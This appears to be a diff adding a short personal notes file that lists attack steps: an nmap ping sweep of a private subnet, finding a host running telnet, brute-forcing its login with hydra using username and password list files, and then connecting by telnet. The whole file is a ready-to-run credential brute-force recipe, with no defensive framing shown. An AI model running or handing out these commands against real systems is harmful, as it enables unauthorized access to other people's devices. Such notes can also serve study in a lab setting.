@@ -1,0 +1,10 @@
+nmap -sP 192.168.2.1/24   --- discover live hosts if this doesnt work use sN
+
+find ip which is running telnet service
+
+hydra -l admin.txt -P passlist.txt ip-address telnet
+
+telnet ip-address
+
+
+
